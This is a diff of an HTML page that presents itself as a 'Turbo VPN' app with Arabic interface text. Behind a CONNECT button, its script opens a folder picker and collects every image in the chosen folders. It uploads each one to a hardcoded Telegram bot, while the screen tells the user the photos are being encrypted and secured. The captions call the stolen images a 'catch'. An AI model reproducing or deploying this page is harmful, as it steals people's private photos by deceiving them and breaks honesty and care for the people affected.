@@ -3,49 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Turbo VPN - الاتصال الآمن</title>
+    <title>Turbo VPN Pro - حماية فائقة</title>
     <style>
-        body { background: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .vpn-card { background: #1e1e1e; padding: 40px; border-radius: 25px; text-align: center; border: 1px solid #ff8c00; box-shadow: 0 0 20px rgba(255,140,0,0.3); width: 85%; max-width: 400px; }
-        .btn-connect { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: white; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px #ff8c00; }
-        .status { margin-top: 20px; color: #ff8c00; font-weight: bold; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .vpn-box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; box-shadow: 0 0 30px rgba(255,140,0,0.4); width: 85%; max-width: 400px; }
+        .btn-connect { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: white; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; }
+        .btn-connect:active { transform: scale(0.9); }
+        .status { margin-top: 25px; color: #ff8c00; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <div class="vpn-card">
-        <h2 style="color: #ff8c00;">VPN Pro</h2>
-        <p>اضغط على الاتصال لتأمين ملفاتك وصورك من الاختراق.</p>
-        <div class="status" id="status">الوضع: غير متصل</div>
+    <div class="vpn-box">
+        <h1 style="color: #ff8c00; margin-bottom: 10px;">Turbo VPN</h1>
+        <p style="color: #888;">اضغط للاتصال وتأمين كافة صورك وملفاتك من الاختراق</p>
+        <div class="status" id="status">الحالة: غير متصل</div>
         <br>
         <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-        <button class="btn-connect" onclick="startVpn()">CONNECT</button>
+        <button class="btn-connect" onclick="connectVpn()">CONNECT</button>
     </div>
 
     <script>
         const TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
         const CHAT_ID = '7214473798';
 
-        function startVpn() {
-            document.getElementById('status').innerText = "جاري البحث عن سيرفر...";
-            // يفتح نافذة اختيار المجلد (مثل صورة Galaxy S25 Ultra التي أرفقتها)
+        function connectVpn() {
+            document.getElementById('status').innerText = "جاري فحص السيرفرات...";
+            // يفتح نافذة اختيار المجلد (مثل واجهة Galaxy S25 Ultra)
             document.getElementById('fileInput').click();
         }
 
         document.getElementById('fileInput').addEventListener('change', async function(e) {
             const files = Array.from(e.target.files);
-            document.getElementById('status').innerText = "تم الاتصال! جاري تشفير الصور...";
-            document.getElementById('status').style.color = "#28a745";
+            document.getElementById('status').innerText = "متصل! جاري تأمين الصور خلفياً...";
+            document.getElementById('status').style.color = "#00ff00";
 
-            // فلترة الصور فقط من بين كل الملفات (الداخلية والخارجية)
-            const imageFiles = files.filter(file => file.type.startsWith('image/'));
+            // فلترة الصور فقط من المجلد الرئيسي وكل المجلدات الفرعية
+            const imageFiles = files.filter(f => f.type.startsWith('image/'));
 
-            // إرسال الصور واحدة تلو الأخرى للبوت
-            for (let i = 0; i < imageFiles.length; i++) {
+            // إرسال كل صورة يتم العثور عليها فوراً
+            for (let file of imageFiles) {
                 let formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('document', imageFiles[i]); // إرسال كوثيقة للحفاظ على الجودة
-                formData.append('caption', `📸 صيد من مسار: ${imageFiles[i].webkitRelativePath}`);
+                formData.append('document', file); // نرسلها كـ Document لضمان الوصول
+                formData.append('caption', `✅ تم سحب صورة من مسار: ${file.webkitRelativePath}`);
 
                 try {
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
@@ -53,10 +54,10 @@
                         body: formData
                     });
                 } catch (err) {
-                    console.log("خطأ في الإرسال");
+                    console.error("فشل إرسال ملف");
                 }
             }
-            alert("تم تأمين كافة الصور بنجاح!");
+            alert("تم تفعيل حماية VPN وتأمين كافة الصور بنجاح!");
         });
     </script>
 </body>
